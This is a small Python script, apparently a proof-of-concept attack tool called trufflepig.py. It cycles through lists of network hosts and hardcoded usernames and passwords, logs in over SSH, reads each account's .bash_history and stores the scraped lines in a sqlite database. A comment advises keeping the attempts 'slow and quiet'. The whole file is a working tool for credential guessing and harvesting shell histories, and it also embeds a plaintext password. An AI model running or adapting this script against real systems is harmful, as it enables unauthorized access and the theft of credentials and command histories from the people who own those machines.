#!/usr/bin/env python
# POC: trufflepig.py - Access remote files looking for goodness
#Ability to run stuff is a side effect...
#...I just wanted to scrape .bash_history's
#This is a fuzzer and scraper, not an example secure coding.
#Author: scp
#import random #always, always import random...
#import time #+time.strftime('%Y%m%d')+
import sys
import pexpect#https://pexpect.readthedocs.io/en/stable/api/pxssh.html
from pexpect import pxssh
#pigs = ['192.168.0.13','192.168.0.15','192.168.0.146','192.168.0.206','192.168.0.208','192.168.0.210','192.168.0.211','192.168.0.213','192.168.0.215','192.168.0.217']
pigs = ['192.168.0.13']
cmds = ['cat ./.bash_history']
fuzzUsers = ['papa']
fuzzPasss = ['hsuR2112']

class pig():
  def __init__(a_pig, name = 'Napoleon', trufflepath = False):
    a_pig.name = name
    a_pig.piglets = []#remember this is recrsive to a point
    a_pig.chits = []
    a_pig.trufflepath = trufflepath
    
  def bbq(this_pig):
    print('let\'s eat',this_pig.name,len(this_pig.piglets))

  def poop(this_pig):
    print('stuff@@@>', list(this_pig.chits))

  def eatTruffles(this_pig):
      truffles=[]
      try:
          if this_pig.trufflepath:#local relative path to file
              with open(this_pig.trufflepath) as fp:
                  line = fp.readline()
                  while line:
                     s=line.strip()
                     truffles.append(line.strip())
                     line = fp.readline()
          elif this_pig.call:#ssh based ...text parse assumes cat of line delim. text
              print(this_pig.call[0], '...working...this ~is Python after all')
              boggle = this_pig.ssh()
              truffles = boggle[1].split(b'\r\n')
          else:
              truffles=['no truffles :-(']
      except:
         truffles=['exception (verify truffflepath or call)'] 
      this_pig.crap = truffles
      return truffles

  def goesToMarket(this_pig):
      chits = []
      for bits in this_pig.crap:
          found = 0
          for idx, familiar_bits in enumerate(chits):
             if (familiar_bits[0] == bits):
                 chits[idx] = (bits,familiar_bits[1] + 1)
                 found = 1
          if found == 0:
              chits.append((bits,1))
      this_pig.chits = chits
      return chits

  def pigFarm(this_pig):#loop for host, user, pass or cmd
      for cmd in cmds:
          for fuzzUser in fuzzUsers:#Spread these out ...slow and quiet like
              for fuzzPass in fuzzPasss:
                  for piglet in pigs:
                      this_piglet = pig('babe_'+piglet)
                      this_piglet.call = [piglet, cmd, fuzzUser,fuzzPass]
                      this_pig.piglets.append(this_piglet)

  def animalFarm(this_pig):#consume loaded data
    for piglet in this_pig.piglets:
        piglet.eatTruffles()
        dbLand(piglet)
        piglet.poop()
        print(piglet.goesToMarket())#Not sent to dbLand
        piglet.bbq()

  def ssh(this_pig):
      out = []
      p = pxssh.pxssh()
      p.login(this_pig.call[0], this_pig.call[2], this_pig.call[3])
      p.prompt()
      out.append(p.before)
      p.sendline(this_pig.call[1])#One line in SSH...
      p.prompt()
      out.append(p.before)
      p.logout()
      this_pig.out = out
      return out

def dbLand(some_pig,nick='truffles',shovel=False):#Beware,.. here there be DBA's
    import sqlite3#https://www.sqlite.org/inmemorydb.html
    conn = sqlite3.connect(nick+'_Oil.db') 
    c = conn.cursor()
    if shovel:c.execute('drop table if exists ' + nick.upper())#Cumulative list? CLear each run?
    c.execute('create table if not exists ' + nick.upper() + ' (last_seen INT NOT NULL DEFAULT 0,' + nick + ' TEXT, UNIQUE(' + nick + ') ON CONFLICT REPLACE )''')
    for i in sorted(list(some_pig.crap)):c.execute('INSERT INTO ' + nick.upper() + ' VALUES (0,?)', [i])
    for i in c.execute('SELECT * FROM ' + nick.upper() + ' ORDER BY ' + nick):print(i)
    conn.commit()
    conn.close()

if __name__ == "__main__":
    if len(sys.argv) > 1:
        trufflepath = sys.argv[1]    
        mainPig = pig('wilbur',trufflepath)       
    else :
        mainPig = pig()       
        mainPig.pigFarm()
        mainPig.animalFarm()
